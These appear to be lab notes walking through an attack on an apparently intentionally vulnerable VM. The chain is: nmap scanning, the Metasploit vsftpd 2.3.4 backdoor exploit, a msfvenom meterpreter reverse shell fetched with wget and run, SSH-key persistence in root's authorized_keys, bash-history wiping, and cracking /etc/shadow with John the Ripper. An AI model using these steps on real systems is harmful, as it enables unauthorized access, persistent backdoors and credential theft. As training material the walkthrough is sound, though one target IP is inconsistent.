# 2.1. Find the target and identify the vulnerability

Scan with Nmap from Kali to know the target IP on the network:

```
nmap -sn 192.168.56.0/24
```

![[Pasted image 20250211190103.png]]

Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:

```
nmap -sT 192.168.56.107
```

![[Pasted image 20250211190940.png]]

We will explore the service version of the protocol `ftp` in the port 21:
```
nmap -sV -p 21 192.168.56.107
```

![[Pasted image 20250211191406.png]]

vsftpd is prone to a backdoor vulnerability because the `vsftpd-2.3.4.tar.gz` source package file contains a backdoor (CVE-2011-2523). An attacker can cause the application to open a backdoor on port 6200 by logging to the FTP server with the username ':)'. We will try to find a vulnerability related to that service version in Metasploit. 

Run Metasploit in Kali:
```
msfconsole
```

```
search vsftpd
```

![[Pasted image 20250211191707.png]]

We know that there is an exploit for that protocol version. Let's exploit it!

---
# 2.2. Exploit the vulnerability

Select the exploit, set the parameters and check that all the options are correct:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set TARGET 0
set RHOSTS 192.168.56.101
options
```

![[Pasted image 20250209200128.png]]

Exploit:
```
exploit
```

Successful exploitation provides a reverse command shell session as the root user (uid=0(root) gid=0(root)) on the target machine, allowing full control over the compromised service. For a more comfortable interface use:

```
script /dev/null -c bash
```

Now you could read a file that is in the target machine. Imagine that there is the file  `testfile.txt` with the following content:

```
Super secret condifential content

username Hello34
pwd 123456789
```

Now you could read files from the attacker `Kali linux`:

![[Pasted image 20250209200514.png]]

---
## 2.3. Post-exploitation: SSH key persistence

After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor. The final objective is to upload a **public SSH key** to the target machine from the attacker machine. 

Use cases for uploading files:
- Deploying Backdoors – Installing persistent malware.
- Executing Scripts – Uploading batch, PowerShell, or Python scripts for automation.
- Privilege Escalation – Dropping exploits or DLL files.
- Data Exfiltration – Uploading tools for data collection and exfiltration.

To upload and download files from the target machine, we will need to create a **payload**. A **payload** is the part of an exploit that executes malicious code on a target system after a vulnerability has been successfully exploited. It determines what happens after access is gained, such as opening a shell, executing commands, or creating a backdoor. **`msfvenom`** is used here to  **generate the payload** for this exploit.

#### Types of Payloads in Metasploit

1. **Singles** – Self-contained, executes a single action (e.g., add a user).
2. **Stagers** – Small, initial payloads that establish a connection and load larger payloads (e.g., `reverse_tcp`).
3. **Stages** – Larger payloads delivered by stagers (e.g., `meterpreter`).

In this example, it will be done the following:
- The attacker sends a small **stager** to the target (`reverse_tcp`).
- The stager connects back to the attacker's machine.
- It then downloads and executes the **stage** (`meterpreter`), which is the full payload.

### 2.3.1. Generate the payload

Generation of payload `reverse_tcp` with `msfvenon`:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf -o hola
```

![[Pasted image 20250215104019.png]]

`hola` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 
![[Pasted image 20250215104057.png]]

We need now a way to send the file to the target machine.

### 2.3.2. Upload, download and execute the payload file
Create a server in the attackers machine so that the target machine can download the infected file from my current directory:
```
python -m http.server 80
```

![[Pasted image 20250214215337.png]]

Download the file in the target machine from the attacker to the target machine using the vsftpd exploit:
```
wget http://<AttackerIp>/hola
```

![[Pasted image 20250215104137.png]]

In the target machine run the payload:
```
chmod +x hola
./hola
```

Now, the attacker machine has to be listening. The `multi/handler` module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or meterpreter sessions. It's commonly used with msfvenom-generated payloads. Prepare the meterpreter listener:

```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <AttackerIp>
set LPORT <PortSelected>
run
```

In the attacker machine you will see the meterpreter session open with the reverse shell:

![[Pasted image 20250215104444.png]]

### 2.3.3. Generate the SSH Key
In the attacker machine, we generate a SSH Key:

```
mkdir ssh
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist_key
```

![[Pasted image 20250215111433.png]]
This creates:
- Private Key: ~/.ssh/persist_key (Keep this safe! It's the attacker backdoor.)
- Public Key: ~/.ssh/persist_key.pub (To inject into the target.)

![[Pasted image 20250215111502.png]]

### 2.3.4. Upload the public SSH Key to the target machine

Transfer the public key to the target (placed in root to maintain root access):

```
upload persist_key.pub /root/.ssh/authorized_keys
```

![[Pasted image 20250215111820.png]]

### 2.3.5. SSH checks in the target machine

Ensure root login via SSH is enabled in `/etc/ssh/sshd_config`:
```
PermitRootLogin yes
```

Restart SSH in the target machine:
```
sudo /etc/init.d/ssh restart
```

![[Pasted image 20250215113357.png]]

Check the state of the SSH port (22) from the attacker machine:
![[Pasted image 20250215115813.png]]

In this case, the port is not open. Enable it from the target machine:
```
sudo ufw allow 22
```

Verify that it is open:
![[Pasted image 20250215121301.png]]
### 2.3.6. SSH Connection

```
ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
```

![[Pasted image 20250215133514.png]]

### 2.3.6.1. Troubleshooting

Host key algorithm AND pub key type has to be defined in the SSH command. Examples of incomplete commands:

```
ssh -i ~/.ssh/persist_key root@target_ip
```

![[Pasted image 20250215133245.png]]

```
ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa root@target_ip
```

![[Pasted image 20250215133412.png]]
I do not know the user password!

### 2.3.7. Hide Your Tracks (Stealth)

Make the SSH key hidden:

```
chmod 400 ~/.ssh/authorized_keys  # read only by owner
chattr +i ~/.ssh/authorized_keys  # Prevent deletion
```

To remove logs:

```
echo "" > ~/.bash_history
history -c
```


---
## 2.4. Post-exploitation: Password and user cracking

Instead of storing actual passwords, systems store the hashed version to enhance security. A **hashed password** is a password that has been transformed into a fixed-length string using a **one-way cryptographic function**.

The hashed passwords and the user details are stored into two important files from the target machine:

- `/etc/shadow`: Stores **hashed** passwords for system users (only accessible by root).
- `/etc/passwd`: Contains user account details (including usernames and user IDs), but **does not** store password hashes anymore.

We will use **John the Ripper (JtR)**, which attempts to crack the hashed passwords using dictionary attacks, brute force, or other methods. But first, we need to passed the information from the target machine using `unshadow`. `unshadow` is a tool that combines `/etc/passwd` and `/etc/shadow` into a format suitable for cracking. This creates `hashes.txt`, which contains usernames alongside their **password hashes**:

```
unshadow passwd shadow > hashes.txt
```

![[Pasted image 20250215164528.png]]

Use John the Ripper:

```
john hashes.txt
```

![[Pasted image 20250215164847.png]]

Now we have the root password: `msfadmin`.

